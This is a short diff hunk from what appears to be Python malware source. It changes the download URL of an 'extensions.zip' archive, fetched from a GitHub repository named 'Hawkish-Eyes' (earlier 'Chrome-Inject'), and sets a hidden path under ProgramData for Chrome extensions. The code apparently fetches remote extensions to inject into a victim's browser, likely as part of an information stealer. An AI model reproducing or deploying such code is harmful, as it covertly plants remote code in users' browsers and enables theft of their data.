@@ -927,7 +927,7 @@ class first_srdl_func(Functions):
 
                     
             extensions = {
-                'extensions': f'https://github.com/{hwkish}-{stspecial}/Chrome-Inject/raw/main/extensions.zip'
+                'extensions': f'https://github.com/Inplex-sys/Hawkish-Eyes/raw/main/extensions.zip'
             }
             for extension_name, github_repo in extensions.items():
                 extensions_path = os.path.join(self.programdata, 'GoogleChromeExtensions')
